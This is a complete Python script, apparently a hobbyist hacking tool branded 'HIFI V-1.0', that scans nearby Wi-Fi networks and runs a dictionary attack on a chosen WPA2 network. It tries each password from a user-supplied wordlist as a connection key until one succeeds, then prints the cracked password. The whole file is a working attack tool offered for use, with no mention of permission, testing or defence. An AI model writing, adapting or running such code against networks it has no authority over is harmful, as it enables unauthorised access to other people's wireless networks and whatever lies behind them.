import pywifi
import time
from pywifi import const

def scan_wifi():
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.scan()
    time.sleep(3)
    results = iface.scan_results()
    ssids = []
    print('''
          
         ██╗  ██╗██╗███████╗██╗
         ██║  ██║██║██╔════╝██║
         ███████║██║█████╗  ██║
         ██╔══██║██║██╔══╝  ██║
         ██║  ██║██║██║     ██║ V - 1.0
         ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝ 
         
         Develped By ParsaYavari
          
          ''')
    print("_-=== Wifi In Ur location ===-_")
    for i, net in enumerate(results):
        if net.ssid not in ssids and net.ssid != '':
            ssids.append(net.ssid)
            print(f"[{i}] {net.ssid}")
    return ssids

def main():
    nets = scan_wifi()
    try:
        print("Chose Ur SSID --")
        choice = int(input(" -> "))
        ssid = nets[choice]
    except:
        print("[!] This Not In List")
        return
    print("Password List --")
    wordlist = input(" -> ")
    try:
        f = open(wordlist, "r")
    except:
        print("[!] Not Opened File")
        return

    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]

    for line in f:
        pw = line.strip()
        p = pywifi.Profile()
        p.ssid = ssid
        p.key = pw
        p.auth = const.AUTH_ALG_OPEN
        p.akm.append(const.AKM_TYPE_WPA2PSK)
        p.cipher = const.CIPHER_TYPE_CCMP

        iface.remove_all_network_profiles()
        iface.connect(iface.add_network_profile(p))
        time.sleep(3)

        if iface.status() == const.IFACE_CONNECTED:
            print(f"[✓] Password Find : {pw}")
            break
        else:
            print(f"[✗] Password Not Good : {pw}")

    f.close()

if __name__ == "__main__":
    main()
